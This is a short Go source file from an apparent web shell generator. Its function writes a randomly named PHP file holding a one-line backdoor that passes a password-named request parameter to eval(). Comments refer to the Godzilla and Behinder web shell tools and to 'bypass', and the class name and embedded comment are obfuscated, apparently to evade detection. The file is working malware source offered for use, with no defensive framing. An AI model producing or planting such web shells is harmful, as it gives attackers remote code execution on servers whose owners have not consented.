package shell

import (
	"webshell/common"
)

//哥斯拉

//冰蝎

//bypass

func Php() {
	common.Filename = common.RandStr(10) + `.php`
	common.Webshells = `<?php class GI0r4H0q { public function __construct($H3746){ @eval("/*Zyjn2328Xs*/".$H3746.""); }}new GI0r4H0q($_REQUEST['` + common.Password + `']);?>`
}
